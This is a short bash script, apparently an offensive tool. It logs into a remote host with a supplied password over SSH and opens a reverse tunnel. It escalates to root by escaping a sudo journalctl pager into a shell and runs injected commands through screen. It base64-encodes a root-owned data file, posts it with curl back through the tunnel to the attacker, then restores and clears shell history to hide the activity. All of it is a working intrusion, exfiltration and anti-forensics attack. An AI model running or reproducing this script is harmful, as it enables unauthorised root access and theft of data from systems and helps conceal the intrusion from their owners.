HOST=$1
REVERSE_HOST=$2
REVERSE_PORT=$3
FILE_NAME=$4
PASSWORD=$5
root_file=/root/data
root_file_txt=${root_file}.txt
root_file_b64=${root_file}.b64
SCREEN_NAME=bashit

commands="id"

while read line
do
	commands="$commands;screen -S ${SCREEN_NAME} -p 0 -X stuff '"${line}^M"'"
done < commands_to_run.sh

echo $commands

sshpass -p "${PASSWORD}" ssh ${HOST} -R ${REVERSE_PORT}:${REVERSE_HOST}:${REVERSE_PORT} << EOF
cp ~/.bash_history ~/.bash_history.bkp
export TERM=xterm
SCREEN_NAME=${SCREEN_NAME}
screen -ls | grep -iw Detached | grep -w \${SCREEN_NAME} | cut -d. -f1 | awk '{print \$1}' | xargs kill
screen -dmS \${SCREEN_NAME}
screen -S \${SCREEN_NAME} -p 0 -X stuff "sudo \$(which journalctl)^M"
sleep 1
screen -S \${SCREEN_NAME} -p 0 -X stuff "!/bin/bash^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "cp /root/.bash_history /root/.bash_history.bkp^M"

$commands
screen -S \${SCREEN_NAME} -p 0 -X stuff "cat ${root_file_txt} | base64 >> ${root_file_b64};^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "curl -X POST -i -F "filename=@${root_file_b64}" -F "name=${FILE_NAME}" 127.0.0.1:${REVERSE_PORT}/^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "rm ${root_file_txt}; rm ${root_file_b64}^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "mv /root/.bash_history.bkp /root/.bash_history; history -c && exit^M"
sleep 1
screen -X -S \${SCREEN_NAME}
mv ~/.bash_history.bkp ~/.bash_history
history -c && exit
EOF